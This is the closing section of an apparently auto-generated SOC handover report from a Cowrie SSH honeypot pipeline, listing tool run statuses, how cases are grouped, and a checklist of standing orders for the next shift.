| Tool 30b | ASN Clustering              | ✅ 17 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 21 priority case(s) shown individually · 14 recon entry/entries in table (7 group(s) consolidating 154 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-10T14:57:56Z_
